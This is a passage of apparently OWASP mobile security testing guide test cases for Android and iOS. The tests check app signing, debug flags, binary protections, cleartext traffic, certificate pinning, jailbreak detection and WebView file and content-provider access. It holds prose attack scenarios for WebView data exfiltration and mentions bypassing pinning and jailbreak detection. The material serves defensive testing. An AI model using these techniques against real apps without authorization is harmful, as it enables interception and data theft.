The output should contain the value of the `minSdkVersion` attribute and the used signature schemes (for example `Verified using v3 scheme (APK Signature Scheme v3): true`).

## Evaluation

The test case fails if the app has a `minSdkVersion` attribute of 24 and above, and only the v1 signature scheme is enabled.
## Usage of Insecure APK Signature Key Size

## Overview

For Android apps, the cryptographic strength of the APK signature is essential for maintaining the app's integrity and authenticity. Using a signature key with insufficient length, such as an RSA key shorter than 2048 bits, weakens security, making it easier for attackers to compromise the signature. This vulnerability could allow malicious actors to forge signatures, tamper with the app's code, or distribute unauthorized, modified versions.

## Steps

1. List the additional signature information using @MASTG-TECH-0116.

## Observation

The output should contain the information about the key size in a line like: `Signer #1 key size (bits):`.

## Evaluation

The test case fails if any of the key sizes (in bits) is less than 2048 (RSA). For example, `Signer #1 key size (bits): 1024`.
## Debuggable Flag Enabled in the AndroidManifest

## Overview

This test case checks if the app has the `debuggable` flag ([`android:debuggable`](https://developer.android.com/guide/topics/manifest/application-element#debug)) set to `true` in the `AndroidManifest.xml`. When this flag is enabled, it allows the app to be debugged enabling attackers to inspect the app's internals, bypass security controls, or manipulate runtime behavior.

Although having the `debuggable` flag set to `true` [is not considered a direct vulnerability](https://developer.android.com/privacy-and-security/risks/android-debuggable), it significantly increases the attack surface by providing unauthorized access to app data and resources, particularly in production environments.

## Steps

1. Obtain the `AndroidManifest.xml` file using @MASTG-TECH-0117.
2. Search for the `debuggable` flag:
    - Look for `android:debuggable` if analyzing raw XML using tools like @MASTG-TOOL-0011.
    - Look for `application-debuggable` if using @MASTG-TOOL-0124.

## Observation

The output should explicitly show whether the `debuggable` flag is set (`true` or `false`). If the flag is not specified, it is treated as `false` by default for release builds.

## Evaluation

The test case fails if the `debuggable` flag is explicitly set to `true`. This indicates that the app is configured to allow debugging, which is inappropriate for production environments.
## Debugging Enabled for WebViews

## Overview

The `WebView.setWebContentsDebuggingEnabled(true)` API enables debugging for **all** WebViews in the application. This feature can be useful during development, but introduces significant security risks if left enabled in production. When enabled, a connected PC can debug, eavesdrop, or modify communication within any WebView in the application. See the ["Android Documentation"](https://developer.chrome.com/docs/devtools/remote-debugging/webviews/#configure_webviews_for_debugging) for more details.

Note that this flag works independently of the `debuggable` attribute in the `AndroidManifest.xml` (see @MASTG-TEST-0226). Even if the app is not marked as debuggable, the WebViews can still be debugged by calling this API.

## Steps

1. Run @MASTG-TECH-0014 with a tool such as @MASTG-TOOL-0110 on the app binary and look for uses of:
    - `WebView.setWebContentsDebuggingEnabled` being set to `true`.
    - `ApplicationInfo.FLAG_DEBUGGABLE`.

## Observation

The output should list:

- All locations where `WebView.setWebContentsDebuggingEnabled` is called with `true` at runtime.
- Any references to `ApplicationInfo.FLAG_DEBUGGABLE`.

## Evaluation

The test case fails if `WebView.setWebContentsDebuggingEnabled(true)` is called unconditionally or in contexts where the `ApplicationInfo.FLAG_DEBUGGABLE` flag is not checked.
## Position Independent Code (PIC) not Enabled

## Overview

[PIE (Position Independent Executables)](../../../Document/0x04h-Testing-Code-Quality.md#position-independent-code) are designed to enhance security by allowing executables to be loaded at random memory addresses, mitigating certain types of attacks.

In the context Mach-O file format of iOS applications:

- PIE is applicable to executables with the `MH_EXECUTE` file type, which essentially means the main app binary (e.g. `YourApp.app/YourApp`).
- Shared libraries with the `MH_DYLIB` file type (dylibs and frameworks) are inherently position-independent and do not utilize the `MH_PIE` flag.

This test case checks if the main executable is compiled with PIE.

## Steps

1. Extract the application and identify the main binary (@MASTG-TECH-0054).
2. Run @MASTG-TECH-0118 on the main binary and grep for "pic" or the corresponding keyword used by the selected tool.

## Observation

The output should list if PIC is enabled or disabled.

## Evaluation

The test case fails if PIC is disabled.
## Stack Canaries Not enabled

## Overview

This test case checks if the native libraries of the app are compiled without common binary protection mechanisms (@MASTG-KNOW-0061) such as stack smashing protection, a mitigation technique against buffer overflow attacks.

This test applies to all binaries and libraries:

- It is especially important for non-memory safe languages like Objective-C or C/C++.
- For pure Swift apps, checking for stack canaries can be usually skipped, as Swift is considered a memory safe by design and conventional parsing techniques cannot detect stack canaries in Swift binaries (see the "canary – exceptions" section of this [blog post](https://sensepost.com/blog/2021/on-ios-binary-protections/)).

To differentiate between Objective-C and Swift binaries, you can inspect the imports and linked libraries. Detecting Objective-C binaries is straightforward, but detecting pure Swift binaries is more challenging because depending on the Swift version and compiler settings, the binary may still contain Objective-C symbols or libraries. See the "identifying objc vs swift" section of this [blog post](https://sensepost.com/blog/2021/on-ios-binary-protections/) for more details.

## Steps

1. Extract the application and identify the main binary (@MASTG-TECH-0054).
2. Identify all shared libraries (@MASTG-TECH-0082).
3. Run @MASTG-TECH-0118 on the main binary and each shared library.
4. If the output contains the symbol `__stack_chk_fail` it indicates stack canaries are enabled.

## Observation

The output should contain a list of symbols of the main binary and each shared library.

## Evaluation

The test case fails if any binary or library is not purely Swift but does not contain methods indicating stack canaries like `objc_autorelease` or `objc_retainAutorelease`.

!!! note
    Checking for the `__stack_chk_fail` symbol only indicates that stack smashing protection is enabled somewhere in the app. While stack canaries are typically enabled or disabled for the entire binary, there may be corner cases where only parts of the application are protected. For example, if the app developer statically links a library with stack smashing protection enabled, but disables it for the entire application.

If you want to be sure that specific security-critical methods are sufficiently protected, you need to reverse-engineer each of them and manually check for stack smashing protection.

When evaluating this, please note that there are potential **expected false positives** for which the test case should be considered as passed. To be certain for these cases, they require manual review of the original source code and the compilation flags used.

The following examples cover some of the false positive cases that might be encountered:

### Use of Memory Safe Languages

The Flutter framework does not use stack canaries because of the way [Dart mitigates buffer overflows](https://docs.flutter.dev/reference/security-false-positives#shared-objects-should-use-stack-canary-values).

### Compiler Optimizations

Sometimes, due to the size of the library and the optimizations applied by the compiler, it might be possible that the library was originally compiled with stack canaries but they were optimized out. For example, this is the case for some [react native apps](https://github.com/facebook/react-native/issues/36870#issuecomment-1714007068). They are built with `-fstack-protector-strong` but when attempting to search for `stack_chk_fail` inside the binary files, it is not found. The React Native developers in this case declare that they won't be adding `-fstack-protector-all` as, in their case, [they consider that doing so will add a performance hit for no effective security gain](https://github.com/facebook/react-native/issues/36870#issuecomment-1714007068).
## Automatic Reference Counting (ARC) not enabled

## Overview

This test case checks if [ARC (Automatic Reference Counting)](../../../Document/0x04h-Testing-Code-Quality.md#automatic-reference-counting) is enabled in iOS apps. ARC is a compiler feature in Objective-C and Swift that automates memory management, reducing the likelihood of memory leaks and other related issues. Enabling ARC is crucial for maintaining the security and stability of iOS applications.

- **Objective-C Code:** ARC can be enabled by compiling with the `-fobjc-arc` flag in Clang.
- **Swift Code:** ARC is enabled by default.
- **C/C++ Code:** ARC is not applicable, as it pertains specifically to Objective-C and Swift.

When ARC is enabled, binaries will include symbols such as `objc_autorelease` or `objc_retainAutorelease`.

## Steps

1. Extract the application and identify the main binary (@MASTG-TECH-0054).
2. Identify all shared libraries (@MASTG-TECH-0082).
3. Run @MASTG-TECH-0118 on the main binary and each shared library looking for ARC symbols like `objc_autorelease` or `objc_retainAutorelease`.

## Observation

The output should contain a list of symbols of the main binary and each shared library.

## Evaluation

The test case fails if any binary or library containing Objective-C or Swift code is missing ARC-related symbols. The presence of symbols such as `_objc_msgSend` (Objective-C) or `_swift_allocObject` (Swift) without corresponding ARC symbols indicates that ARC may not be enabled.

!!! note
    Checking for these symbols only indicates that ARC is enabled somewhere in the app. While ARC is typically enabled or disabled for the entire binary, there can be corner cases where only parts of the application or libraries are protected. For example, if the app developer statically links a library that has ARC enabled, but disables it for the entire application.

    If you want to be sure that specific security-critical methods are adequately protected, you need to reverse-engineer each of them and manually check for ARC, or request the source code from the developer.
## References to Logging APIs

## Overview

This test verifies if an app uses logging APIs like `android.util.Log`, `Log`, `Logger`, `System.out.print`, `System.err.print`, and `java.lang.Throwable#printStackTrace`.

## Steps

1. Use either @MASTG-TECH-0014 with a tool such as @MASTG-TOOL-0110 to identify all logging APIs.

## Observation

The output should contain a list of locations where logging APIs are used.

## Evaluation

The test case fails if an app logs sensitive information from any of the listed locations.
## Hardcoded HTTP URLs

## Overview

An Android app may have hardcoded HTTP URLs embedded in the app binary, library binaries, or other resources within the APK. These URLs may indicate potential locations where the app communicates with servers over an unencrypted connection.

!!! warning Limitations
    The presence of HTTP URLs alone does not necessarily mean they are actively used for communication. Their usage may depend on runtime conditions, such as how the URLs are invoked and whether cleartext traffic is allowed in the app's configuration. For example, HTTP requests may fail if cleartext traffic is disabled in the AndroidManifest.xml or restricted by the Network Security Configuration. See @MASTG-TEST-0235.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Run a static analysis (@MASTG-TECH-0014) tool and look for any `http://` URLs.

## Observation

The output should contain a list of URLs and their locations within the app.

## Evaluation

The test case fails if any HTTP URLs are confirmed to be used for communication.

The presence of hardcoded HTTP URLs does not inherently mean they are used; their actual usage must be validated through careful inspection and testing:

- **Reverse Engineering**: Inspect the code locations where the HTTP URLs are referenced. Determine if they are merely stored as constants or actively used to create HTTP requests through networking APIs like `HttpURLConnection` or `OkHttp`.
- **Static Analysis**: Analyze the app's configuration to identify whether cleartext traffic is permitted. For example, check the AndroidManifest.xml for `android:usesCleartextTraffic="true"` or inspect the `network_security_config`. Refer to @MASTG-TEST-0235 for detailed guidance.

Additionally, complement this static inspection with dynamic testing methods:

- **Dynamic Analysis**: Use tools like Frida to hook into networking APIs at runtime. This can reveal how and when the HTTP URLs are used during execution. See @MASTG-TEST-0238 for more details.

- **Network Traffic Interception**: Capture and analyze network traffic using tools like Burp Suite, mitmproxy, or Wireshark. This approach confirms whether the app connects to the identified HTTP URLs during real-world usage but depends on the tester's ability to exercise the app's functionality comprehensively. See @MASTG-TEST-0236.
## Missing Implementation of Server Hostname Verification with SSLSockets

## Overview

This test checks whether an Android app uses [`SSLSocket`](https://developer.android.com/reference/javax/net/ssl/SSLSocket) without a [`HostnameVerifier`](https://developer.android.com/reference/javax/net/ssl/HostnameVerifier), allowing connections to servers presenting certificates with **wrong or invalid hostnames**.

By default, `SSLSocket` [does not perform hostname verification](https://developer.android.com/privacy-and-security/security-ssl#WarningsSslSocket). To enforce it, the app must explicitly invoke [`HostnameVerifier.verify()`](https://developer.android.com/reference/javax/net/ssl/HostnameVerifier#verify%28java.lang.String,%20javax.net.ssl.SSLSession%29) and implement proper checks.

Such unsafe implementations can allow an attacker to run a [MITM attack](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm) with a valid (or self-signed) certificate and intercept or tamper with the app's traffic.

**Note:** The connection succeeds even if the app has a fully secure Network Security Configuration (NSC) in place because `SSLSocket` is not affected by it.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Run a static analysis (@MASTG-TECH-0014) tool and look for all usages of `SSLSocket` and `HostnameVerifier`.

## Observation

The output should contain a list of locations where `SSLSocket` and `HostnameVerifier` are used.

## Evaluation

The test case fails if the app uses `SSLSocket` without a `HostnameVerifier`.

!!! note
    If a `HostnameVerifier` is present, ensure it's not implemented in an unsafe manner. See @MASTG-TEST-0283 for guidance.
## Android App Configurations Allowing Cleartext Traffic

## Overview

Since Android 9 (API level 28) cleartext HTTP traffic is blocked by default (thanks to the [default Network Security Configuration](../../../Document/0x05g-Testing-Network-Communication.md#default-configurations)) but there are multiple ways in which an application can still send it:

- **AndroidManifest.xml**: Setting the [`android:usesCleartextTraffic`](https://developer.android.com/guide/topics/manifest/application-element#usesCleartextTraffic) attribute of the `<application>` tag. Note that this flag is ignored in case the Network Security Configuration is configured.
- **Network Security Configuration**: Setting the [`cleartextTrafficPermitted`](https://developer.android.com/privacy-and-security/security-config#CleartextTrafficPermitted) attribute to `true` on `<base-config>` or `<domain-config>` elements.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Obtain the AndroidManifest.xml.
3. Obtain the Network Security Configuration.
4. Read the value of `usesCleartextTraffic` from the AndroidManifest.xml.
5. Read the value of `cleartextTrafficPermitted` from the NSC `<base-config>` element.
6. Read the value of `cleartextTrafficPermitted` from the NSC `<domain-config>` elements.

## Observation

The output should contain a list of configurations potentially allowing for cleartext traffic.

## Evaluation

The test case fails if cleartext traffic is permitted. This can happen if any of the following is true:

1. The AndroidManifest sets `usesCleartextTraffic` to `true` and there's no NSC.
2. The NSC sets `cleartextTrafficPermitted` to `true` in the `<base-config>`.
3. The NSC sets `cleartextTrafficPermitted` to `true` in any `<domain-config>`.

!!! note
    The test doesn't fail if the AndroidManifest sets `usesCleartextTraffic` to `true` and there's a NSC, even if it only has an empty `<network-security-config>` element. For example:

    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <network-security-config>
    </network-security-config>
    ```
## Cleartext Traffic Observed on the Network

## Overview

This test intercepts the app's incoming and outgoing network traffic, and checks for any cleartext communication.
Whilst the static checks can only show _potential_ cleartext traffic, this dynamic test shows all communication the application definitely makes.

!!! warning Limitation
    - Intercepting traffic on a network level will show all traffic _the device_ performs, not only the single app. Linking the traffic back to a specific app can be difficult, especially when more apps are installed on the device.
    - Linking the intercepted traffic back to specific locations in the app can be difficult and requires manual analysis of the code.
    - Dynamic analysis works best when you interact extensively with the app. But even then there could be corner cases which are difficult or impossible to execute on every device. The results from this test therefore are likely not exhaustive.

## Steps

You can use one of the following approaches:

- Set up @MASTG-TECH-0010 (for Android) or @MASTG-TECH-0062 (for iOS) to capture all traffic.
- Set up @MASTG-TECH-0011 (for Android) or @MASTG-TECH-0063 (for iOS) to capture all traffic.

**Notes**:

- Interception proxies will show HTTP(S) traffic only. You can, however, use some tool-specific plugins such as [Burp-non-HTTP-Extension](https://github.com/summitt/Burp-Non-HTTP-Extension) or other tools like @MASTG-TOOL-0078 to decode and visualize communication via XMPP and other protocols.
- Some apps may not function correctly with proxies like Burp and @MASTG-TOOL-0079 because of certificate pinning. In such a scenario, you can still use basic network sniffing to detect cleartext traffic. Otherwise, you can try to disable pinning (see @MASTG-TECH-0012 for Android and @MASTG-TECH-0064 for iOS)

## Observation

The output should contain the captured network traffic.

## Evaluation

The test case fails if any clear text traffic originates from the target app.

!!! note
    This can be challenging to determine because traffic can potentially come from any app on the device. See the [Overview](#overview) section.
## Jailbreak Detection in Code

## Overview

The test verifies that a mobile app can detect if the iOS device it is running on is jailbroken. It does so by statically analyzing the app binary for [common jailbreak detection checks](../../../Document/0x06j-Testing-Resiliency-Against-Reverse-Engineering.md#common-jailbreak-detection-checks). For example, the app may check for the presence of a third-party app store (e.g. Sileo, Zebra, ...), or for the presence of certain files or directories that are indicative of a jailbroken device.

The limitations of static analysis should be considered. It is possible that the app uses more sophisticated jailbreak detection techniques that are not detected by the used tool. In such cases, careful manual reverse engineering and deobfuscation are required to identify the jailbreak detection checks.

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary looking for common jailbreak detection checks.

## Observation

The output should include any instances of common jailbreak detection checks in the app binary.

## Evaluation

The test case fails if jailbreak detection is not implemented. However, note that this test is not exhaustive and may not detect all jailbreak detection checks. Manual reverse engineering and deobfuscation may be required to identify more sophisticated jailbreak detection checks.
## Runtime Use of Jailbreak Detection Techniques

## Overview

The test verifies that a mobile application can identify if the iOS device it is running on is jailbroken. It does so by dynamically analyzing the app binary for [common jailbreak detection checks](../../../Document/0x06j-Testing-Resiliency-Against-Reverse-Engineering.md#common-jailbreak-detection-checks) and trying to bypass them. For example, it may detect a check for the presence of certain files or directories that are indicative of a jailbroken device.

The limitations of using jailbreak detection bypass tools should be considered. It is possible that the app uses more sophisticated jailbreak detection techniques that are not detected by the tool used. In such cases, careful manual reverse engineering and deobfuscation are required to identify the jailbreak detection checks. Also, additional dynamic analysis work may be required to bypass the jailbreak detection checks.

## Steps

1. Run a dynamic analysis tool such as @MASTG-TOOL-0038 on the app and execute its [automated jailbreak detection bypass commands](../../../Document/0x06j-Testing-Resiliency-Against-Reverse-Engineering.md#automated-jailbreak-detection-bypass)

## Observation

The output should include any instances of common jailbreak detection checks in the app binary and the results of the automated jailbreak detection bypass commands.

## Evaluation

The test case fails if jailbreak detection is not implemented.

!!! note
    This test is not exhaustive and may not detect all jailbreak detection checks as it relies on predefined bypass code that may not cover all possible jailbreak detection checks or may not be up-to-date. The checks may also be more sophisticated than what the tool can detect, so manual reverse engineering and deobfuscation may be required to identify them.
## Missing Certificate Pinning in Network Security Configuration

## Overview

Apps can configure [certificate pinning using the Network Security Configuration](../../../knowledge/android/MASVS-NETWORK/MASTG-KNOW-0015.md#pinning-via-network-security-configuration-api-24). For each domain, one or multiple digests can be pinned.

The goal of this test is to check if the app does not implement certificate pinning using the NSC. However, note that the app may be using other pinning methods covered in other tests.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Obtain the AndroidManifest.xml (@MASTG-TECH-0117), and check if a `networkSecurityConfig` is set in the `<application>` tag.
3. Inspect the referenced network security config file, and extract all domains from `<domain-config>` which have a pin set (`<pin-set>`).

## Observation

The output should contain a list of domains which enable certificate pinning.

## Evaluation

The test case fails if no `networkSecurityConfig` is set, or any relevant domain does not enable certificate pinning.
## Expired Certificate Pins in the Network Security Configuration

## Overview

Apps can configure expiration dates for pinned certificates in the Network Security Configuration (NSC) (@MASTG-KNOW-0014) by using the `expiration` attribute. When a pin expires, the app no longer enforces certificate pinning and instead relies on its configured trust anchors. This means the connection will still succeed if the server presents a valid certificate from a trusted CA (such as a system CA or a custom CA defined in the app's configuration). However, if no trusted certificate is available, the connection will fail.

If developers assume pinning is still in effect but don't realize it has expired, the app may start trusting CAs it was never intended to.

> Example: A financial app previously pinned to its own private CA but, after expiration, starts trusting publicly trusted CAs, increasing the risk of compromise if a CA is breached.

The goal of this test is to check if any expiration date is in the past.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Inspect the AndroidManifest.xml, and check if a `networkSecurityConfig` is set in the `<application>` tag. If yes, inspect the referenced file, and extract the expiration dates for every domain.

## Observation

The output should contain a list of expiration dates for pinned certificates.

## Evaluation

The test case fails if any expiration date is in the past.
## Missing Certificate Pinning in Network Traffic

## Overview

There are multiple ways an application can implement certificate pinning, including via the Android Network Security Config, custom TrustManager implementations, third-party libraries, and native code. Since some implementations might be difficult to identify through static analysis, especially when obfuscation or dynamic code loading is involved, this test uses network interception techniques to determine if certificate pinning is enforced at runtime.

The goal of this test case is to observe whether a [MITM attack](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm) can intercept HTTPS traffic from the app. A successful MITM interception indicates that the app is either not using certificate pinning or implementing it incorrectly.

If the app is properly implementing certificate pinning, the MITM attack should fail because the app rejects certificates issued by an unauthorized CA, even if the CA is trusted by the system.

_Testing Tip:_ While performing the MITM attack, it can be useful to monitor the system logs (see @MASTG-TECH-0009). If a certificate pinning/validation check fails, an event similar to the following log entry might be visible, indicating that the app detected the MITM attack and did not establish a connection.

`I/X509Util: Failed to validate the certificate chain, error: Pin verification failed`

## Steps

1. Set up an interception proxy, see @MASTG-TECH-0011.
2. Install the application on a device connected to that proxy, and intercept the communication.
3. Extract all domains which were intercepted.

## Observation

The output should contain a list of domains for which the interception was successful.

## Evaluation

The test case fails if any relevant domain was intercepted.
## References to APIs for Detecting Secure Screen Lock

## Overview

This test verifies whether an app is running on a device with a passcode set. Android apps can determine whether a secure [screen lock (such as PIN, or password)](https://support.google.com/android/answer/9079129) is enabled by using platform-provided APIs. Specifically, apps can utilize the [KeyguardManager](https://developer.android.com/reference/android/app/KeyguardManager) API, which provides the [isDeviceSecure()](https://developer.android.com/reference/android/app/KeyguardManager#isDeviceSecure()) and [isKeyguardSecure()](https://developer.android.com/reference/android/app/KeyguardManager#isKeyguardLocked()) methods to check if the device has a secure lock mechanism in place.

Additionally, apps can use the [BiometricManager#canAuthenticate(int)](https://developer.android.com/reference/android/hardware/biometrics/BiometricManager#canAuthenticate(int)) API to check whether biometric authentication is available and can be used. Since biometric authentication on Android requires a secure screen lock as a fallback, this method can serve as an alternative check when [KeyguardManager](https://developer.android.com/reference/android/app/KeyguardManager) is unavailable or restricted by device manufacturers.

If an app relies on biometrics for authentication, it should ensure that biometric authentication is enforced using the [BiometricPrompt](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt) API or by requiring authentication for cryptographic key access via the **Android KeyStore System**. However, apps **cannot force** users to enable biometrics at the system level, only enforce its use within the app for accessing sensitive functionality.

## Steps

1. Use @MASTG-TOOL-0110 to identify the API that checks whether a secure screen lock has been set.

## Observation

The output should contain a list of locations where relevant APIs are used.

## Evaluation

The test case fails if an app doesn't use any API to verify the secure screen lock presence.
## Runtime Use of Secure Screen Lock Detection APIs

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0247.

## Steps

1. Run a dynamic analysis tool like @MASTG-TOOL-0001 and look for uses of `KeyguardManager.isDeviceSecure` and `BiometricManager.canAuthenticate` APIs.

## Observation

The output should contain a list of locations where relevant APIs are used.

## Evaluation

The test case fails if an app doesn't use any API to verify the secure screen lock presence.
## References to Content Provider Access in WebViews

## Overview

This test checks for references to Content Provider access in WebViews which is enabled by default and can be disabled using the `setAllowContentAccess` method in the `WebSettings` class. If improperly configured, this can introduce security risks such as unauthorized file access and data exfiltration.

The JavaScript code would have access to any content providers on the device such as:

- declared by the app, **even if they are not exported**.
- declared by other apps, **only if they are exported** and if they are not following recommended [best practices](https://developer.android.com/privacy-and-security/security-tips#content-providers) to restrict access.

Refer to @MASTG-KNOW-0018 for more information on the `setAllowContentAccess` method, the specific files that can be accessed and the conditions under which they can be accessed.

**Example Attack Scenario:**

Suppose a banking app uses a WebView to display dynamic content. The developers have not explicitly set the `setAllowContentAccess` method, so it defaults to `true`. Additionally, JavaScript is enabled in the WebView as well as the `setAllowUniversalAccessFromFileURLs` method.

1. An attacker exploits a vulnerability (such as an XSS flaw) to inject malicious JavaScript into the WebView. This could occur through a compromised or malicious link that the WebView loads without proper validation.
2. Thanks to `setAllowUniversalAccessFromFileURLs(true)`, the malicious JavaScript can issue requests to `content://` URIs to read locally stored files or data exposed by content providers. Even those content providers from the app that are not exported can be accessed because the malicious code is running in the same process and same origin as the trusted code.
3. The attacker-controlled script exfiltrates sensitive data from the device to an external server.

**Note 1:** We do not consider `minSdkVersion` since `setAllowContentAccess` defaults to `true` regardless of the Android version.

**Note 2:** The provider's `android:grantUriPermissions` attribute is irrelevant in this scenario as it does not affect the app itself accessing its own content providers. It allows **other apps** to temporary access URIs from the provider even though restrictions such as `permission` attributes, or `android:exported="false"` are set. Also, if the app uses a `FileProvider`, the `android:grantUriPermissions` attribute must be set to `true` by [definition](https://developer.android.com/reference/androidx/core/content/FileProvider#:~:text=Set%20the%20android:grantUriPermissions%20attribute%20to%20true%2C%20to%20allow%20you%20to%20grant%20temporary%20access%20to%20files.%20) (otherwise you'll get a `SecurityException: Provider must grant uri permissions"`).

**Note 3:** `allowUniversalAccessFromFileURLs` is critical in the attack since it relaxes the default restrictions, allowing pages loaded from `file://` to access content from any origin, including `content://` URIs.

If this setting is not enabled, the following error will appear in `logcat`:

```text
[INFO:CONSOLE(0)] "Access to XMLHttpRequest at 'content://org.owasp.mastestapp.provider/sensitive.txt'
from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported
for protocol schemes: http, data, chrome, https, chrome-untrusted.", source: file:/// (0)
```

While the `fetch` request to the external server would still work, retrieving the file content via `content://` would fail.

## Steps

1. Use a tool like semgrep to search for references to:
      - the `WebView` class.
      - the `WebSettings` class.
      - the `setJavaScriptEnabled` method.
      - the `setAllowContentAccess` method from the `WebSettings` class.
      - the `setAllowUniversalAccessFromFileURLs` method from the `WebSettings` class.
2. Obtain all content providers declared in the app's AndroidManifest.xml file.

## Observation

The output should contain:

- A list of WebView instances including the following methods and their arguments:
    - `setAllowContentAccess`
    - `setJavaScriptEnabled`
    - `setAllowUniversalAccessFromFileURLs`
- A list of content providers declared in the app's AndroidManifest.xml file.

## Evaluation

The test case fails if all of the following applies:

- `setJavaScriptEnabled` is explicitly set to `true`.
- `setAllowContentAccess` is explicitly set to `true` or _not used at all_ (inheriting the default value, `true`).
- `setAllowUniversalAccessFromFileURLs` method is explicitly set to `true`.

You should use the list of content providers obtained in the observation step to verify if they handle sensitive data.

!!! note
    The `setAllowContentAccess` method being set to `true` does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack.
## Runtime Use of Content Provider Access APIs in WebViews

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0250.

## Steps

1. Run a dynamic analysis tool like @MASTG-TOOL-0001 and either:
    - enumerate instances of `WebView` in the app and list their configuration values
    - or explicitly hook the setters of the `WebView` settings

## Observation

The output should contain a list of WebView instances and corresponding settings.

## Evaluation

The test case fails if all of the following applies:

- `JavaScriptEnabled` is `true`.
- `AllowContentAccess` is `true`.
- `AllowUniversalAccessFromFileURLs` is `true`.

You should use the list of content providers obtained in @MASTG-TEST-0250 to verify if they handle sensitive data.

!!! note
    `AllowContentAccess` being `true` does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack.
## References to Local File Access in WebViews

## Overview

This test checks for references to methods from the [`WebSettings`](https://developer.android.com/reference/android/webkit/WebSettings.html) class used by Android WebViews which enable loading content from various sources, including local files. If improperly configured, these methods can introduce security risks such as unauthorized file access and data exfiltration. These methods are:

- `setAllowFileAccess`: allows the WebView to load local files from the app's internal storage or external storage.
- `setAllowFileAccessFromFileURLs`: lets JavaScript within those local files access other local files.
- `setAllowUniversalAccessFromFileURLs`: removes any cross-origin restrictions, allowing that JavaScript to read data across origins. The JavaScript **can always send data to any origin** (e.g. via `POST`), regardless of this setting; this setting only affects reading data (e.g. the code wouldn't get a response to a `POST` request but the data would still be sent).

When these settings are combined, they can enable an attack in which a malicious HTML file gains elevated privileges, accesses local resources, and exfiltrates data over the network, effectively bypassing the security boundaries typically enforced by the same-origin policy.

Even though these methods have secure defaults and are **deprecated in Android 10 (API level 29) and later**, they can still be explicitly set to `true` or their insecure defaults may be used in apps that run on older versions of Android (due to their `minSdkVersion`).

Refer to [Android WebView Local File Access Settings](../../../Document/0x05h-Testing-Platform-Interaction.md#webview-local-file-access-settings) for more information on these methods (default values, deprecation status, security implications), the specific files that can be accessed, and the conditions under which they can be accessed.

**Example Attack Scenario**:

Suppose a banking app uses a WebView to display dynamic content, and the developers enabled all three insecure settings. Additionally, JavaScript is enabled in the WebView.

1. An attacker injects a malicious HTML file into the device (via phishing or another exploit) into a location that the attacker _knows_ the WebView will access it from (e.g. thanks to reverse engineering). For example, an HTML file used to display the app's terms and conditions.
2. The WebView can load the malicious file because of `setAllowFileAccess(true)`.
3. Thanks to `setJavaScriptEnabled(true)` and `setAllowFileAccessFromFileURLs(true)`, the JavaScript in the malicious file (running in a `file://` context) is able to access other local files using `file://` URLs.
4. The attacker-controlled script exfiltrates sensitive data from the device to an external server.

**Note 1**: Either `setAllowFileAccessFromFileURLs` or `setAllowUniversalAccessFromFileURLs` must be set to `true` for the attack to work. If both settings are set to `false`, the following error will appear in `logcat`:

```bash
[INFO:CONSOLE(0)] "Access to XMLHttpRequest at 'file:///data/data/org.owasp.mastestapp/files/api-key.txt' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, https, chrome-untrusted.", source: file:/// (0)
[INFO:CONSOLE(31)] "File content sent successfully.", source: file:/// (31)
```

And the server would not receive the file content:

```bash
[*] Received POST data from 127.0.0.1:

Error reading file: 0
```

**Note 2**: As indicated in the Android docs, the value of [**`setAllowFileAccessFromFileURLs` is ignored**](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs(boolean)) if `allowUniversalAccessFromFileURLs=true`.

## Steps

1. Determine the `minSdkVersion` of the app.
2. Use a tool like semgrep to search for references to:
      - the `WebView` class.
      - the `WebSettings` class.
      - the `setJavaScriptEnabled` method.
      - the `setAllowFileAccess`, `setAllowFileAccessFromFileURLs`, and `setAllowUniversalAccessFromFileURLs` methods from the `WebSettings` class.

Note that in this case **the lack of references to the `setAllow*` methods is especially interesting** and must be captured, because it could mean that the app is using the default values, which in some scenarios are insecure. For this reason, it's highly recommended to try to identify every WebView instance in the app.

## Observation

The output should contain a list of WebView instances where the abovementioned methods are used.

## Evaluation

The test case fails if all of the following applies (based on the [API behavior across different Android versions](../../../Document/0x05h-Testing-Platform-Interaction.md#webview-local-file-access-settings)):

- `setJavaScriptEnabled` is explicitly set to `true`.
- `setAllowFileAccess` is explicitly set to `true` (or not used at all when `minSdkVersion` < 30, inheriting the default value, `true`).
- Either `setAllowFileAccessFromFileURLs` or `setAllowUniversalAccessFromFileURLs` is explicitly set to `true` (or not used at all when `minSdkVersion` < 16, inheriting the default value, `true`).

!!! note
    `AllowFileAccess` being `true` does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack.
## Runtime Use of Local File Access APIs in WebViews

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0252.

## Steps

1. Run a dynamic analysis tool like @MASTG-TOOL-0001 and either:
    - enumerate instances of `WebView` in the app and list their configuration values
    - or explicitly hook the setters of the `WebView` settings, including:
        - `setJavaScriptEnabled`
        - `setAllowFileAccess`
        - `setAllowFileAccessFromFileURLs`
        - `setAllowUniversalAccessFromFileURLs`

## Observation

The output should contain a list of WebView instances and corresponding settings.

## Evaluation

The test case fails if all of the following applies (based on the [API behavior across different Android versions](../../../Document/0x05h-Testing-Platform-Interaction.md#webview-local-file-access-settings)):

- `setJavaScriptEnabled` is explicitly set to `true`.
- `setAllowFileAccess` is explicitly set to `true` (or not used at all when `minSdkVersion` < 30, inheriting the default value, `true`).
- Either `setAllowFileAccessFromFileURLs` or `setAllowUniversalAccessFromFileURLs` is explicitly set to `true` (or not used at all when `minSdkVersion` < 16, inheriting the default value, `true`).

!!! note
    `AllowFileAccess` being `true` does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack.
